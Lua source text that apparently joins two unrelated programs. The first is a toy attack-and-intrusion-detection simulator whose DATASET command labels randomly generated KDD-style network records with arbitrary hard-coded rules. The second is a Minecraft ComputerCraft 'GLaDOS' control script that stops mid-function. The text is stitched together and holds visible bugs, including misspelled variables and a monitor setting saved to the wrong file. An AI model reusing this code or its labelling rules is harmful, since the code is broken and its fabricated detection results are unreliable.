           io.write("\n@same_srv_rate")
           
           io.write("\n@diff_srv_rate")
           
           io.write("\n@srv_diff_host_rate")
           
           io.write("\n@dst_host_count")
           
           io.write("\n@dst_host_srv_count")
           
           io.write("\n@dst_host_same_srv_rate")
           
           io.write("\n@dst_host_diff_srv_rate")
           
           io.write("\n@dst_host_same_src_port_rate")
           
           io.write("\n@dst_host_srv_diff_host_rate")
           
           io.write("\n@dst_host_diff_srv_rate")
           
           io.write("\n@dst_host_src_port_rate")
           
           io.write("\n@dst_host_srv_diff_host_rate")
           
           io.write("\n@dst_host_serror_rate")
           
           io.write("\n@dst_host_srv_serror_rate")
           
           io.write("\n@dst_host_rerror_rate")
           
           io.write("\n@dst_host_srv_rerror_rate")
           
           io.write("\n@class")
           
            io.write("\n@malwaredetect")
            

        
    


  
elseif words[1]=="INTRUDERS" or words[1]=="intruders" then  
     if paxname >= 10 then
       if transdata>=20 and transdatab>=50 and transdatax>=500 then
        if atthostip1 then
          io.write(atthostip1 .. "." .. atthostip2 .. "." .. atthostip3 .. "." .. atthostip4 .. "\n")
        end
        if atthostip5 then
          io.write(atthostip5 .. "." .. atthostip6 .. "." .. atthostip7 .. "." .. atthostip8 .. "\n")
        end
        if atthostip9 then
          io.write(atthostip9 .. "." .. atthostip10 .. "." .. atthostip11 .. "." .. atthostip12 .. "\n")
        end
        if atthostip13 then
          io.write(atthostip13 .. "." .. atthostip14 .. "." .. atthostip15 .. "." .. atthostip16 .. "\n")
        end
        if atthostip17 then
          io.write(atthostip17 .. "." .. atthostip18 .. "." .. atthostip19 .. "." .. atthostip20 .. "\n")
        end
        if atthostip21 then
          io.write(atthostip21 .. "." .. atthostip22 .. "." .. atthostip23 .. "." .. atthostip24 .. "\n")
        end
       end
     else
       io.write("No intruders were detected")  
      
     end
       




    
elseif words[1]=="HIDE" or words[1]=="hide" then   
   if paxname >= 10 then
     if words[2]=="MIX" and words[3]==nil then
            digdi = digdi + 1
            serizmix = serizmix + 1
              io.write("Hiding of inbound and outbound data though MIX-nets has been enabled")   
             
        elseif words[2]=="DC" and words[3]==nil then
      digdi = digdi + 1
      serizdc = serizdc + 1
               io.write("Hiding of inbound and outbound data though DC-nets has been enabled")   
               
         else 
      io.write("You must set an undetectability technique")
      
         end  
         else
  io.write("No attacker's host has been set")
    end  
   
elseif words[1]=="UNHIDE" or words[1]=="unhide" then   
      if paxname >= 10 then

     if words[2]=="MIX" and words[3]==nil then
      if serizmix>=1 then
              io.write("Unhiding of inbound and outbound data though MIX-nets has been enabled")   
              digdi=0
        else 
           io.write("You have not used MIX-nets before")
        end
             
      elseif words[2]=="DC" and words[3]==nil then
       if serizdc>=1 then
               io.write("Uniding of inbound and outbound data though DC-nets has been enabled")   
        digdi=0
        else
          io.write("You have not used DC-nets before.")
        end
         else 
      io.write("You must set an undetectability technique")
      
      end    
      
      else
  io.write("No attacker's host has been set")
end
      

elseif (words[1]=="HELP" or words[1]=="help") and words[2]==nil then   

                 
            io.write("ATTACK <DOS,XSS,RFI,SQL,SHELL,REMBUFF,MALWARE,BRUTE,ARP,CSRF,MASQUERADE,PROBE,HIJACK> <IP address>\nGENERATE <IN,OUT,MAL> <number of packets>\nREPEAT <DOS,SHELL,REMBUFF,CSRF,SQL,XSS,ARP,RFI>\nSEND <ACK,TCP,RST,FIN,MALF,UDP,SYN> <number of packets> <IP address>\nINCLUDE <CONFIG,RULESET>\nLIST\nHIDE <MIX,DC>\nUNHIDE <MIX,DC>\nINFO\nANONYMIZE\nSET <NETIP1,NETIP2,NETIP3,NETIP4,NETIP5,HOSTIP1,HOSTIP2,HOSTIP3,HOSTIP4,HOSTIP5,HOSTIP6,ATTHOSTIP1,ATTHOSTIP2,ATTHOSTIP3,ATTHOSTIP4,ATTHOSTIP5,ATTHOSTIP6,ATTNETIP1,ATTNETIP2,ATTNETIP3,ATTNETIP4,ATTNETIP4,ATTNETIP5> <IP address>\nDETECT <DOS,XSS,RFI,SQL,SHELL,REMBUFF,MALWARE,BRUTE,ARP,CSRF,MASQUERADE,PROBE,HIJACK>\nATTEMPT <DOS,XSS,LDAP,XPATH,SHELL> <IP address>\nDATASET\nALARMS\nINTRUDERS\nVISUALIZE\nANALYZE <HEX,FRAMES>\nHELP\n\nEnable Detectability:\nSET NETIP1 <Network Address>\nSET HOSTIP1 <Host Address>\nINCLUDE RULESET\nINCLUDE CONFIG\n\nEnable Attacking:\nSET ATTHOSTIP1 <Attacker's Host Address>")   


 elseif words[1]=="DATASET" or words[1]=="dataset" then   

            

   CC = z+m+e+b+c+d+f+a+masq+hij+pk+jk+psm+xpath
    cg = yp + gen + geno + tz
    cmal = ym + genmal + tb
    
      if (CC >= 1 or cg >=1 or cmal >=1) and transdata>=20 and transdatab>=50 and transdatax>=500 then
       looper = looper + 1
   number= cg 
      

 table.insert(numberdata, looper , number)
   
    
    
    
    

   io.flush()
   
  
   
  
     local filec = io.open("datasets/" .. arxeio2 .. arxeio2 .. arxeio2 .. arxeio2 .. arxeio .. ".data", "w")
         
 
 
   for i = 1, cg+cmal do
  
      duration = math.random(0,255)
      protocoltype = myTablec[ math.random( #myTablec ) ] 
    service = myTabled[ math.random( #myTabled ) ] 

flag = myTablee[ math.random( #myTablee ) ] 
src_bytes = math.random(0,3255)
dst_bytes = math.random(0,3255)
land = math.random(0,1)
wrong_fragment = math.random(0,255)
urgent = math.random(0,255)
hot = math.random(0,255) 
num_failed_logins = math.random(0,255)
logged_in = math.random(0,1)
num_compromised = math.random(0,255)
root_shell = math.random(0,155)
      su_attempted = math.random(0,99255)
    num_root = math.random(0,99255)  
          num_file_creations = math.random(0,99255)  
    num_shells = math.random(0,99255)  
    num_access_files = math.random(0,99255)  
    num_outbound_cmds = math.random(0,700)  
    is_host_login = math.random(0,1)  
is_guest_login = math.random(0,1) 
count= math.random(0,1000) 
srv_count = math.random(0,1000) 
serror_rate = math.random(0,100) / 100
srv_serror_rate = math.random(0,100) / 100
rerror_rate = math.random(0,100) / 100
srv_rerror_rate = math.random(0,100)  / 100
src_port= math.random(0,65535) 
dst_port= math.random(0,65535) 
xssdetect = math.random(0,100) 
average_rtt = math.random(0,500)
iplen = math.random(0,400) 
ethlen = math.random(0,400) 
stan_dev_rtt = math.random(0,500)  
same_srv_rate = math.random(0,100) / 100
diff_srv_rate = math.random(0,100) / 100
srv_diff_host_rate = math.random(0,100) / 100
dst_host_count = math.random(0,1000)
dst_host_srv_count = math.random(0,1000)
dst_host_same_srv_rate = math.random(0,100) / 100
dst_host_diff_srv_rate = math.random(0,100) / 100 
dst_host_same_src_port_rate = math.random(0,100) / 100
dst_host_srv_diff_host_rate = math.random(0,100) / 100
dst_host_serror_rate = math.random(0,100) / 100
dst_host_srv_serror_rate = math.random(0,100) / 100
dst_host_rerror_rate = math.random(0,100) / 100
dst_host_srv_rerror_rate = math.random(0,100) / 100
malwaredetect = math.random(0,100) 
if cmal==0 then
  class='normal'
else

class = classchoice[ math.random( #classchoice ) ]
end  
      variablex='1'
    
      
    
      
    
    
    if (numberdata[looper] > numberdata[looper-1]) and (looper ~= 2) then
    table.insert(data, i , duration .. "," .. protocoltype .. "," .. flag .. "," .. src_bytes .. "," .. dst_bytes .. "," .. land .. "," .. wrong_fragment .. "," .. urgent .. "," .. hot .. "," .. num_failed_logins .. "," .. logged_in .. "," .. num_compromised .. "," .. root_shell .. "," .. su_attempted .. "," .. num_root .. "," .. num_file_creations .. "," .. num_shells .. "," .. num_access_files .. "," .. num_outbound_cmds .. "," .. is_host_login .. "," .. is_guest_login .. "," .. count .. "," .. srv_count .. "," .. serror_rate .. "," .. srv_serror_rate .. "," .. rerror_rate .. "," .. srv_rerror_rate .. "," .. src_port .. "," .. dst_port .. "," .. xssdetect .. "," .. average_rtt .. "," .. iplen .. "," .. ethlen .. "," .. stan_dev_rtt .. "," .. same_srv_rate .. "," .. diff_srv_rate .. "," .. srv_diff_host_rate .. "," .. dst_host_count .. "," .. dst_host_srv_count .. "," .. dst_host_same_srv_rate .. "," .. dst_host_diff_srv_rate .. "," .. dst_host_same_src_port_rate .. "," .. dst_host_srv_diff_host_rate .. "," .. dst_host_serror_rate .. "," .. dst_host_srv_serror_rate .. "," .. dst_host_rerror_rate .. "," .. dst_host_srv_rerror_rate .. "," .. class .. "," .. malwaredetect)
    end
    if (looper==2) then
    table.insert(data, i , duration .. "," .. protocoltype .. "," .. flag .. "," .. src_bytes .. "," .. dst_bytes .. "," .. land .. "," .. wrong_fragment .. "," .. urgent .. "," .. hot .. "," .. num_failed_logins .. "," .. logged_in .. "," .. num_compromised .. "," .. root_shell .. "," .. su_attempted .. "," .. num_root .. "," .. num_file_creations .. "," .. num_shells .. "," .. num_access_files .. "," .. num_outbound_cmds .. "," .. is_host_login .. "," .. is_guest_login .. "," .. count .. "," .. srv_count .. "," .. serror_rate .. "," .. srv_serror_rate .. "," .. rerror_rate .. "," .. srv_rerror_rate .. "," .. src_port .. "," .. dst_port .. "," .. xssdetect .. "," .. average_rtt .. "," .. iplen .. "," .. ethlen .. "," .. stan_dev_rtt .. "," .. same_srv_rate .. "," .. diff_srv_rate .. "," .. srv_diff_host_rate .. "," .. dst_host_count .. "," .. dst_host_srv_count .. "," .. dst_host_same_srv_rate .. "," .. dst_host_diff_srv_rate .. "," .. dst_host_same_src_port_rate .. "," .. dst_host_srv_diff_host_rate .. "," .. dst_host_serror_rate .. "," .. dst_host_srv_serror_rate .. "," .. dst_host_rerror_rate .. "," .. dst_host_srv_rerror_rate .. "," .. class .. "," .. malwaredetect)
    
    end

     i = i + 1
    


 
    
    if class=='normal' then
       if (srv_count > 332) and (protocoltype == 'icmp') then
          variablex = 'false negative'
        elseif (same_srv_rate) <= 0.32 and (dst_host_diff_srv_rate) <= 0.14 and (src_bytes) <= 0 and (dst_host_same_src_port_rate) <= 0.02 and (diff_srv_rate) <= 0.58 then
          variablex = 'false negative'
          elseif (wrong_fragment) <= 0 and (num_compromised) > 0 and (src_bytes) > 10073 then
            variablex = 'false negative'
         elseif (wrong_fragment) > 0 and (protocoltype == 'udp') then
           variablex = 'false negative'
        elseif (dst_host_srv_serror_rate) > 0.82 and (flag == 'SH') and (srv_count) <= 80 then
         variablex = 'false negative'
         elseif (srv_serror_rate) > 0.51 and (dst_host_diff_srv_rate) > 0.7 and (same_srv_rate) <= 0.25 then
          variablex = 'false negative'
        elseif (srv_serror_rate > 0.51) and (src_bytes <= 0) and (land == 0) and (dst_host_serror_rate > 0.68) and (flag == 'S0') and (dst_host_same_src_port_rate) <= 0.17 then
        variablex = 'false negative'
        elseif (count > 327) and (diff_srv_rate > 0.73) then
          variablex = 'false negative'
        elseif (dst_host_srv_rerror_rate > 0.82) and (dst_host_count > 72) and (dst_host_same_src_port_rate > 0.01) then
          variablex = 'false negative'
        elseif (dst_host_srv_diff_host_rate <= 0.24) and (wrong_fragment <= 0) and (src_bytes) > 6 and (rerror_rate <= 0.08) and (hot > 24) and (hot <= 28) then
          variablex = 'false negative'
        elseif (dst_host_srv_diff_host_rate > 0.24) and (wrong_fragment > 0) then
         variablex = 'false negative' 
        elseif (dst_host_srv_diff_host_rate > 0.24) and (src_bytes <= 20) and (land == 0) and (dst_host_rerror_rate <= 0.99) and (dst_host_srv_diff_host_rate > 0.36) and (dst_bytes <= 1) then
         variablex = 'false negative'
        elseif (xssdetect >= 90) or (malwaredetect >=90) then
          variablex = 'false negative'
        elseif (wrong_fragment) > 190 then
             variablex = 'false negative'
        elseif (src_bytes > 20) and (flag == 'RSTO') and (num_failed_logins > 0) then
            variablex = 'false negative'
        elseif (protocoltype == 'udp') and (src_bytes <= 5) and (dst_host_count > 69) then
            variablex = 'false negative'
        elseif (protocoltype == 'udp') and (service == 'private') then
            variablex='false negative'
        elseif (protocoltype == 'icmp') and (src_bytes > 351) and (service == 'ecr_i') then
        variablex = 'false negative'
        elseif (src_bytes > 22) and (srv_rerror_rate <= 0.08) and (dst_host_srv_diff_host_rate > 0.09) and (dst_host_same_srv_rate > 0.55) and (root_shell <= 0) and (logged_in == 1) then 
        variablex = 'false negative'
        elseif (same_srv_rate <= 0.46) and (diff_srv_rate > 0.88) and (srv_count <= 1) then variablex = 'false negative'
        elseif (dst_host_srv_diff_host_rate > 0.23) and (dst_host_srv_serror_rate <= 0.1) and (srv_count > 2) and (protocoltype == 'icmp') then 
        variablex = 'false negative'
        elseif (src_bytes > 245) and (src_bytes > 12943) and (duration <= 1285) and (service == 'http') then
        variablex = 'false negative'
        elseif (dst_host_srv_diff_host_rate > 0.23) and (dst_host_srv_serror_rate > 0.1) then 
        variablex = 'false negative'
        elseif (dst_host_srv_diff_host_rate > 0.23) and (dst_bytes > 717) and (num_compromised <= 1) then 
        variablex = 'false negative'
        elseif (dst_host_srv_diff_host_rate > 0.23) and (service == 'eco_i') and (src_bytes > 13) and (src_bytes <= 24) then 
        variablex = 'false negative'
        elseif (dst_host_srv_serror_rate <= 0.3) and (src_bytes <= 245) and
(dst_host_diff_srv_rate > 0.95) and (urgent <= 0) and (src_bytes <= 35) and (dst_host_same_srv_rate > 0) then
        variablex = 'false negative'
        elseif (dst_host_srv_serror_rate <= 0.3) and (root_shell <= 0) and (src_bytes <= 245) and (count <= 3) and (hot <= 0) and (dst_bytes > 251578) and (duration > 1) then
        variablex = 'false negative'
        elseif (srv_serror_rate <= 0.2) and (dst_host_rerror_rate > 0.89) and
(service == 'private') and (flag == 'REJ') then 
        variablex = 'false negative'
        elseif (srv_serror_rate <= 0.2) and (root_shell <= 0) and (logged_in == 1) and
(dst_bytes <= 0) and (count <= 3) and (dst_host_same_srv_rate > 0.03) and (dst_host_srv_diff_host_rate <= 0.2) and (src_bytes > 305) and (src_bytes <= 1015) then
        variablex = 'false negative'
        elseif (dst_host_srv_serror_rate > 0.25) and (dst_host_same_srv_rate <= 0.04) then
        variablex = 'false negative'
        elseif (srv_serror_rate > 0.2) and (duration <= 30) and (land == 0) and
(srv_rerror_rate <= 0.01) then
        variablex = 'false negative'
        elseif (root_shell > 0) and (num_shells > 0) and (num_file_creations <= 2) then
        variablex = 'false negative'
        elseif (root_shell > 0) and (num_file_creations <= 2) and (dst_host_same_src_port_rate > 0.06) then 
        variablex = 'false negative'
        elseif (srv_serror_rate > 0.27) and (duration <= 30) and (land == 0) then
        variablex = 'false negative'
        elseif (flag == 'OTH') or (flag == 'S0') then
        variablex = 'false negative'
        elseif (duration > 1564) and (dst_bytes <= 2801) then
        variablex = 'false negative'
        elseif (flag == 'RSTR') and (num_failed_logins <= 0) and (duration <= 94) then
        variablex = 'false negative'
        elseif (num_file_creations <= 0) and (dst_host_rerror_rate > 0.87) and (service == 'telnet') then
        variablex = 'false negative'
        elseif (protocoltype == 'icmp') and (src_bytes <= 19) and (dst_host_srv_diff_host_rate <= 0.12) and (dst_host_count <= 3) then
        variablex = 'false negative'
        elseif (protocoltype == 'icmp') and (src_bytes <= 19) and (src_bytes <= 13) then 
        variablex = 'false negative'
        elseif (protocoltype == 'icmp') and (dst_host_same_srv_rate > 0.22) and (src_bytes > 19) and (src_bytes > 300) then 
        variablex = 'false negative'
        elseif (num_access_files > 0) and (service == 'http') then
        variablex = 'false negative'
        elseif (logged_in == 1) and (dst_bytes <= 1) and (duration <= 6) and (src_bytes <= 2722) then
        variablex = 'false negative'
        elseif (logged_in == 0) and (service == 'http') and (dst_bytes <= 85) then
        variablex = 'false negative'
        elseif (protocoltype == 'icmp') and (src_bytes <= 169) then
        variablex = 'false negative'
        elseif (srv_rerror_rate <= 0.5) and (protocoltype == 'tcp') and (src_bytes > 1031) and (num_file_creations <= 0) and (service == 'ftp_data') and (duration > 6) then
        variablex = 'false negative'
        elseif (protocoltype == 'tcp') and (is_guest_login == 1) and (num_access_files <= 0) and (dst_host_rerror_rate <= 0.04) then
        variablx = 'false negative'
        elseif (protocoltype == 'tcp') and (dst_host_srv_serror_rate > 0.25) and (duration <= 179) then
        variablex = 'false negative'
        elseif (protocoltype == 'tcp') and (dst_host_count > 7) and (hot <= 0) and (num_compromised <= 7) and (dst_host_same_src_port_rate > 0) then
        variablex = 'true negative'
        elseif (protocoltype == 'tcp') and (dst_host_same_srv_rate <= 0.22) and (num_failed_logins <= 2) then
        variablex = 'false negative'
        elseif (protocoltype == 'tcp') and (is_guest_login == 0) and (service == 'telnet') and (hot <= 2) then
        variablex = 'false negative'
        elseif (dst_host_same_srv_rate > 0.37) and (protocoltype == 'tcp') and
(logged_in == 1) and (root_shell <= 0) then
        variablex = 'false negative'
        elseif (protocoltype == 'tcp') and (service == 'ftp_data') and (dst_bytes <= 236934) then
        variablex = 'true positive'
        else 
           variablex = 'true negative'
        end
    
    
 else


       if (srv_count > 332) and (protocoltype == 'icmp') then
          variablex = 'true positive'
        elseif (same_srv_rate) <= 0.32 and (dst_host_diff_srv_rate) <= 0.14 and (src_bytes) <= 0 and (dst_host_same_src_port_rate) <= 0.02 and (diff_srv_rate) <= 0.58 then
          variable= 'true positive'
        elseif (wrong_fragment) <= 0 and (num_compromised) > 0 and (src_bytes) > 10073 then
            variablex = 'true positive'
         elseif (wrong_fragment) > 0 and (protocoltype == 'udp') then
           variablex = 'true positive'
        elseif (dst_host_srv_serror_rate) > 0.82 and (flag == 'SH') and (srv_count) <= 80 then
         variablex = 'true positive'
        elseif (srv_serror_rate) > 0.51 and (dst_host_diff_srv_rate) > 0.7 and (same_srv_rate) <= 0.25 then
          variablex = 'true positive'
          elseif (srv_serror_rate > 0.51) and (src_bytes <= 0) and (land == 0) and (dst_host_serror_rate > 0.68) and (flag == 'S0') and (dst_host_same_src_port_rate) <= 0.17 then
        variablex = 'true positive'
        elseif (count > 327) and (diff_srv_rate > 0.73) then
          variablex = 'true positive'
        elseif (dst_host_srv_rerror_rate > 0.82) and (dst_host_count > 72) and (dst_host_same_src_port_rate > 0.01) then
          variablex = 'true positive'
          elseif (dst_host_srv_diff_host_rate <= 0.24) and (wrong_fragment <= 0) and (src_bytes) > 6 and (rerror_rate <= 0.08) and (hot > 24) and (hot <= 28) then
          variablex = 'true positive'
           elseif (dst_host_srv_diff_host_rate > 0.24) and (wrong_fragment > 0) then
         variablex = 'true positive'
         elseif (dst_host_srv_diff_host_rate > 0.24) and (src_bytes <= 20) and (land == 0) and (dst_host_rerror_rate <= 0.99) and (dst_host_srv_diff_host_rate > 0.36) and (dst_bytes <= 1) then
         variablex = 'true positive'
         elseif (xssdetect >= 90) or (malwaredetect >=90) then
          variablex = 'true positive'
          elseif (wrong_fragment) > 190 then
             variablex = 'true positive'
         elseif (src_bytes > 20) and (flag == 'RSTO') and (num_failed_logins > 0) then
            variablex = 'true positive'
        elseif (protocoltype == 'udp') and (src_bytes <= 5) and (dst_host_count > 69) then
            variablex = 'true positive'
        elseif (protocoltype == 'udp') and (service == 'private') then
            variablex = 'true positive'
        elseif (protocoltype == 'icmp') and (src_bytes > 351) and (service == 'ecr_i') then
        variablex = 'true positive'
        elseif (src_bytes > 22) and (srv_rerror_rate <= 0.08) and (dst_host_srv_diff_host_rate > 0.09) and (dst_host_same_srv_rate > 0.55) and (root_shell <= 0) and (logged_in == 1) then variablex = 'true positive'
        elseif (same_srv_rate <= 0.46) and (diff_srv_rate > 0.88) and (srv_count <= 1) then variablex = 'true positive'
        elseif (dst_host_srv_diff_host_rate > 0.23) and (dst_host_srv_serror_rate <= 0.1) and (srv_count > 2) and (protocoltype == 'icmp') then 
        variablex = 'true positive'
        elseif (src_bytes > 245) and (src_bytes > 12943) and (duration <= 1285) and (service == 'http') then
        variablex = 'true positive'
        elseif (dst_host_srv_diff_host_rate > 0.23) and (dst_host_srv_serror_rate > 0.1) then 
        variablex = 'true positive'
        elseif (dst_host_srv_diff_host_rate > 0.23) and (dst_bytes > 717) and (num_compromised <= 1) then 
        variablex = 'true positive'
        elseif (dst_host_srv_diff_host_rate > 0.23) and (service == 'eco_i') and (src_bytes > 13) and (src_bytes <= 24) then 
        variablex = 'true positive'
        elseif (dst_host_srv_serror_rate <= 0.3) and (src_bytes <= 245) and
(dst_host_diff_srv_rate > 0.95) and (urgent <= 0) and (src_bytes <= 35) and (dst_host_same_srv_rate > 0) then
        variablex = 'true positive'
        elseif (dst_host_srv_serror_rate <= 0.3) and (root_shell <= 0) and (src_bytes <= 245) and (count <= 3) and (hot <= 0) and (dst_bytes > 251578) and (duration > 1) then
        variablex = 'true positive'
        elseif (srv_serror_rate <= 0.2) and (dst_host_rerror_rate > 0.89) and
(service == 'private') and (flag == 'REJ') then 
        variablex = 'true positive'
        elseif (srv_serror_rate <= 0.2) and (root_shell <= 0) and (logged_in == 1) and
(dst_bytes <= 0) and (count <= 3) and (dst_host_same_srv_rate > 0.03) and (dst_host_srv_diff_host_rate <= 0.2) and (src_bytes > 305) and (src_bytes <= 1015) then
        variablex = 'true positive'
        elseif (dst_host_srv_serror_rate > 0.25) and (dst_host_same_srv_rate <= 0.04) then
        variablex = 'true positive'
        elseif (srv_serror_rate > 0.2) and (duration <= 30) and (land == 0) and
(srv_rerror_rate <= 0.01) then
        variablex = 'true positive'
        elseif (root_shell > 0) and (num_shells > 0) and (num_file_creations <= 2) then
        variablex = 'true positive'
        elseif (root_shell > 0) and (num_file_creations <= 2) and (dst_host_same_src_port_rate > 0.06) then 
        variablex = 'true positive'
        elseif (srv_serror_rate > 0.27) and (duration <= 30) and (land == 0) then
        variablex = 'true positive'
        elseif (flag == 'OTH') or (flag == 'S0') then
        variablex = 'true positive'
        elseif (duration > 1564) and (dst_bytes <= 2801) then
        variablex = 'true positive'
        elseif (flag == 'RSTR') and (num_failed_logins <= 0) and (duration <= 94) then
        variablex = 'true positive'
        elseif (num_file_creations <= 0) and (dst_host_rerror_rate > 0.87) and (service == 'telnet') then
        variablex = 'true positive'
        elseif (protocoltype == 'icmp') and (src_bytes <= 19) and (dst_host_srv_diff_host_rate <= 0.12) and (dst_host_count <= 3) then
        variablex = 'true positive'
        elseif (protocoltype == 'icmp') and (src_bytes <= 19) and (src_bytes <= 13) then 
        variablex = 'true positive'
        elseif (protocoltype == 'icmp') and (dst_host_same_srv_rate > 0.22) and (src_bytes > 19) and (src_bytes > 300) then 
        variablex = 'true positive'
        elseif (num_access_files > 0) and (service == 'http') then
        variablex = 'true positive'
        elseif (logged_in == 1) and (dst_bytes <= 1) and (duration <= 6) and (src_bytes <= 2722) then
        variablex = 'true positive'
        elseif (logged_in == 0) and (service == 'http') and (dst_bytes <= 85) then
        variablex = 'true positive'
        elseif (protocoltype == 'icmp') and (src_bytes <= 169) then
        variablex = 'true positive'
        elseif (srv_rerror_rate <= 0.5) and (protocoltype == 'tcp') and (src_bytes > 1031) and (num_file_creations <= 0) and (service == 'ftp_data') and (duration > 6) then
        variablex = 'true positive'
        elseif (protocoltype == 'tcp') and (is_guest_login == 1) and (num_access_files <= 0) and (dst_host_rerror_rate <= 0.04) then
        variablex = 'true positive'
        elseif (protocoltype == 'tcp') and (dst_host_srv_serror_rate > 0.25) and (duration <= 179) then
        variablex = 'true positive'
        elseif (protocoltype == 'tcp') and (dst_host_count > 7) and (hot <= 0) and (num_compromised <= 7) and (dst_host_same_src_port_rate > 0) then
        variablex = 'false positive'
        elseif (protocoltype == 'tcp') and (dst_host_same_srv_rate <= 0.22) and (num_failed_logins <= 2) then
        variablex = 'true positive'
        elseif (protocoltype == 'tcp') and (is_guest_login == 0) and (service == 'telnet') and (hot <= 2) then
        variablex = 'true positive'
        elseif (dst_host_same_srv_rate > 0.37) and (protocoltype == 'tcp') and
(logged_in == 1) and (root_shell <= 0) then
        variablex = 'true positive'
        elseif (protocoltype == 'tcp') and (service == 'ftp_data') and (dst_bytes <= 236934) then
        variablex = 'true positive'
        else 
           variablex = 'false positive'
        end
    end
    
    
      
    end
     
    
      table.sort(data, function(aNM,bNM) return aNM>bNM end)
        table.concat(data, ", ")
     for _,v in pairs(data) do
       
  io.write(data[_] .. "\n")
  filec:write(data[_] .. "\n")
 
   end
   
   filec:close()
   
   else
       io.write("No traffic was detected")
   end
   
     
                     
 




 


    
  
    
    


else
 io.write("Not valid command")

 
 
         
        
         
         
     

  
end





    
    
    
    
 io.write("\n ")

  

i = i + 1

until s=='EXIT' or s=='exit' or msg1=='exit' or msg2=='exit' or msg3=='exit' or msg4=='exit' or msg5=='exit' or msg1=='EXIT' or msg2=='EXIT' or msg3=='EXIT' or msg4=='EXIT' or msg5=='EXIT'

goto final

do


local owner = "Spector18"
 
term.clear()
term.setCursorPos(1, 1)
rednet.open("back")
local compid = os.getComputerID()
print("ID of main computer is: "..compid)
chat = peripheral.wrap("left")
voice = peripheral.wrap("right")
local monside = "top"
local endinput
local emptytable = { }
local emptyvar = 0
 
local rscorefile = "rscore"
local dcorefile = "dcore"
local aecorefile = "aecore"
local moncorefile = "moncore"
local ownerfile = "owners"
--
if fs.exists(ownerfile) then
print("found owners")
else
print("creating owner file")
print(" ")
print("please input your name:")
local firstowner = read()
local firstownert = {firstowner}
local file = fs.open(ownerfile,"w")
file.write(textutils.serialize(firstownert))
file.close()
end
 
if fs.exists(rscorefile) then
print("found redstone cores")
else
print("creating redstone cores file")
local file = fs.open(rscorefile,"w")
file.write(textutils.serialize(emptytable))
file.close()
end
 
if fs.exists(dcorefile) then
print("found door cores")
else
print("creating door cores file")
local file = fs.open(dcorefile,"w")
file.write(textutils.serialize(emptytable))
file.close()
end
 
 
if fs.exists(moncorefile) then
print("found monitor core")
else
print("creating monitor core file")
local file = fs.open(moncorefile,"w")
file.write(textutils.serialize(emptyvar))
file.close()
end
 
if fs.exists(aecorefile) then
print("found AE core")
else
print("creating AE core file")
local file = fs.open(aecorefile,"w")
file.write(textutils.serialize(emptyvar))
file.close()
end
--
function savevar(var,name)
local file = fs.open(name,"w")
file.write(textutils.serialize(var))
file.close()
end
 
function loadvar(name)
local file = fs.open(name,"r")
local data = file.readAll()
file.close()
return textutils.unserialize(data)
end
 
 
function savetable(table,name)
local file = fs.open(name,"w")
file.write(textutils.serialize(table))
file.close()
end
 
function loadtable(name)
local file = fs.open(name,"r")
local data = file.readAll()
file.close()
return textutils.unserialize(data)
end
 
--load cores
local owners = loadtable(ownerfile)
local rscores = loadtable(rscorefile)
local dcores = loadtable(dcorefile)
local aecore = loadvar(aecorefile)
local moncore = loadvar(moncorefile)
 
 
print("owners:")
for key,value in pairs( owners ) do
   print(tostring(key)..": "..tostring(value))
end
 
 
print("loading cores")
print(" ")
print("redstone cores:")
for key,value in pairs( rscores ) do
   print(tostring(key)..": "..tostring(value))
end
print(" ")
print("door cores:")
for key,value in pairs( dcores ) do
   print(tostring(key)..": "..tostring(value))
end
 
print(" ")
print("AE core: "..aecore)
print("monitor core: "..moncore)
 
--end core loading
 
function cWrite(text, side, scale)
          if (peripheral.isPresent(side)) and (peripheral.getType(side) == "monitor") then
            monitor = peripheral.wrap(side)
          else return false
          end
          monitor.clear()
          monitor.setCursorPos(1,1)
          local x2,y2 = monitor.getCursorPos()
          local x, y = monitor.getSize()
          monitor.setCursorPos(math.ceil((x / 2) - (text:len() / 2)), math.ceil(y / 2))
       
          monitor.setTextScale(scale)
          monitor.write(text)
          return true
    end
       
cWrite("GLaDOS", monside, 1)
os.sleep(2)
cWrite("standby", monside, 1)
 
function talk(messagee)
os.sleep(1)
chat.tell(owner, messagee)
voice.speak(messagee)
cWrite(messagee, monside, 1)
os.sleep(2)
cWrite("Standby", monside, 1)
end
 
talk(owner.."'s me is online")
 
 
function turnoff()
talk("shutting down...")
os.sleep(2)
talk(owner.."'s GLaDOS is offline")
os.sleep(2)
cWrite("OFF", monside, 1)
os.shutdown()
end
 
 
function addprog(name)
endinput = false
if fs.exists(name) then
talk("file exists")
return
end
local file = fs.open(name,"w")
talk("say what you want added to the function")
os.sleep(1)
talk("say 'end;' to end input")
while endinput==false do
event, player, funcinput = os.pullEvent("chat")
if funcinput=="end;" then
file.close()
endinput = true
talk("ended input")
else
print(name.." : "..funcinput)
file.write(funcinput)
end -- end input stream
end
end
 
function runprog(name)
if fs.exists(name) then
talk("running function : "..name)
shell.run(name)
else
talk("file does not exist")
end
end
 
 
----------------------------------------------------------------------------------------
function receive()
while true do
local senderID, rcm, distance = rednet.receive()
print("received signal from computer "..senderID..": "..rcm)
os.sleep(2)
----------------------------
if rcm=="glados overide all systems shutdown" then
os.sleep(1)
talk("received overide: "..rcm)
os.sleep(4)
turnoff()
end
----------------------------
if string.sub(rcm, 1, 11)=="overide say" then
local ss = string.sub(rcm, 13, 30)
talk(ss)
end
----------------------------
end
end
----------------------------------------------------------------------------------------
 
 
----------------------------------------------------------------------------------------
function commands(command, player)
if string.find(command, "glados,") then -- begin commands
print(player..": "..command)
 
--set AE core
if string.sub(command, 1, 19)=="set ae core" then
local s = string.sub(command, 21, 40)
n = tonumber(s)
savevar(n, aecorefile)
talk("set applied energistics core to: "..s)
end
 
--set monitor core
if string.sub(command, 1, 23)=="set monitor core" then
local s = string.sub(command, 25, 40)
n = tonumber(s)
savevar(n, aecorefile)
talk("set applied energistics core to: "..s)
end
 
--remove core
if string.sub(command, 1, 19)=="remove core" then
local s = string.sub(command, 21, 40)
-----begin redstone core
if s=="redstone" then
talk("say name of core")
event, player, corename = os.pullEvent("chat")
for key,value in pairs( rscores ) do
   if key==corename then
   rscores[key] = nil
   talk("redstone core: "..key.." has been removed")
   savetable(rscores, rscorefile)
   return
   end
end
end
-----begin door core
if s=="door" then
talk("say name of core")
event, player, corename = os.pullEvent("chat")
for key,value in pairs( dcores ) do
   if key==corename then
   dcores[key] = nil
   talk("door core: "..key.." has been removed")
   savetable(dcores, dcorefile)
   return
   end
end
end
 
 
 
 
end
 
 
-- add core
if string.sub(command, 1, 16)=="add core" then
local s = string.sub(command, 18, 40)
-----begin redstone core
if s=="redstone" then
